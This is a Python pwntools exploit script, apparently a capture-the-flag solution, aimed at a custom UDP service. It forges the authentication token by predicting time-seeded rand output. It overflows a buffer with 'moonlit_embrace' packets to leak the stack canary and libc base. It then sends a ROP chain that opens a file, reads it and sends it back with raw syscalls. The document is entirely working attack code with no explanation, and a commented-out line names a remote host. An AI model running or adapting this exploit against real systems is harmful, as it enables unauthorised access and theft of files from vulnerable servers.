from pwn import *
from ctypes import *
import socket 
from time import sleep 
import sys

libc=ELF('./libc.so.6')
glibc = cdll.LoadLibrary('libc.so.6')
#io=remote('157.245.147.89', 24210, typ="udp")
io=remote('0', 9981, typ='udp')

opcode=[0x301, 0x101, 0x201]

def printdata(size, data):
    pl=p32(0x70303070)
    pl+=p32(opcode[0])
    pl+=p16(size)
    pl+=data
    io.send(pl)
    
plain=b''
session=b''
def genarate_rand_string(size=0, data=0):
    global plain
    pl=p32(0x70303070)
    pl+=p32(opcode[1])
    pl+=p16(size)
    pl+=b'A'*100
    io.send(pl)
    glibc.srand(glibc.time(None))
    for i in range(32):
        plain+=p8(glibc.rand() & 0xff)    
    print(plain.hex())
    data= io.recv()
    return data
    
def authenticate(size=0):
    global session
    pl=p32(0x70303070)
    pl+=p32(opcode[2])
    pl+=p16(0x100)
    pl+=plain
    io.send(pl)
    data= io.recv()
    session=io.recv()
    print(data)
    return session
     
genarate_rand_string()  
a=authenticate()
# print(a)
# pause()
# printdata(0xfff, b'A'*0xfff)
# print(io.recv())
# data=io.recv(0x1000)
# heap=u64(data[4:10].ljust(8, b'\0')) - 0x4ba0
# print(hex(heap))
    
session=a
buf=session
buf+=p32(0)
buf+=p16(0x30a+1)
buf+=b'moonlit_embrace\0'
buf+=(778+1-len(b'moonlit_embrace\0'))*b'A'


io.send(buf)
data = io.recv()
leak=u64(b'\0'+data[265:])
log.info("canary: " + hex(leak))

session=a
buf=session
buf+=p32(0)
buf+=p16(0x30a+1+7+8)
buf+=b'moonlit_embrace\0'
buf+=(778+8-len(b'moonlit_embrace'))*b'A'
buf+=data[265:]
buf+=b'A'*8

io.send(buf)

data = io.recv()
libc.address=u64(data[264+8+8:].ljust(8, b'\0')) - 0x94ac3
log.info("libc.address: " + hex(libc.address))



pop_rax=0x0000000000045eb0+libc.address
bin_sh=libc.address+next(libc.search(b'/bin/sh\0'))
pop_rdi=libc.address+0x000000000002a3e5
pop_rsi=libc.address+0x000000000002be51
pop_rdx=libc.address+0x00000000000796a2
mov_rdi_rdx=libc.address+0x0000000000149709
mov_r8_rbx=0x0000000000121f8a+libc.address
pop_rcx_rbx=libc.address+0x0000000000108b04
ret=pop_rdi+1
xchg_edi_eax=0x000000000009198d+libc.address
mov_rax_r8=0x000000000011db23+libc.address
syscall=0x14101b+libc.address

pl=b''
pl+=p64(pop_rdi) 
pl+=p64(libc.bss(40))
pl+=p64(pop_rdx)
pl+=p64(8319607999311079471)
pl+=p64(mov_rdi_rdx)
pl+=p64(pop_rdi)
pl+=p64(libc.bss(40)+8)
pl+=p64(pop_rdx)
pl+=p64(29099040799945317)
pl+=p64(mov_rdi_rdx)
pl+=p64(pop_rdi)
pl+=p64(libc.bss(40)+16)
pl+=p64(pop_rdx)
pl+=p64(0)
pl+=p64(mov_rdi_rdx)
pl+=p64(pop_rsi)
pl+=p64(0)
pl+=p64(pop_rdx)
pl+=p64(0)
pl+=p64(pop_rdi)
pl+=p64(libc.bss(40))
pl+=p64(pop_rax)
pl+=p64(2)
pl+=p64(syscall)
pl+=p64(xchg_edi_eax)
pl+=p64(pop_rsi)
pl+=p64(libc.bss(40))
pl+=p64(pop_rdx)
pl+=p64(0x100)
pl+=p64(pop_rax)
pl+=p64(0)
pl+=p64(syscall)
pl+=p64(pop_rcx_rbx)
pl+=p64(0)
pl+=p64(0)
pl+=p64(pop_rdi)
pl+=p64(0xb)
pl+=p64(pop_rdx)
pl+=p64(12)
pl+=p64(pop_rax)
pl+=p64(44)
pl+=p64(syscall)


session=a
buf=session
buf+=p32(0)
buf+=p16(0x500)
buf+=b'moonlit_embrace\0'
buf+=(778-len(b'moonlit_embrace\0'))*b'A'
buf+=p64(leak)
buf+=b'A'*8
buf+=pl
io.send(buf)

pause()
session=a
buf=session
buf+=p32(0)
buf+=p16(0x100)
buf+=b'moonlit_embraceaaa'

io.send(buf)
data = io.recv()
print(data)



io.interactive()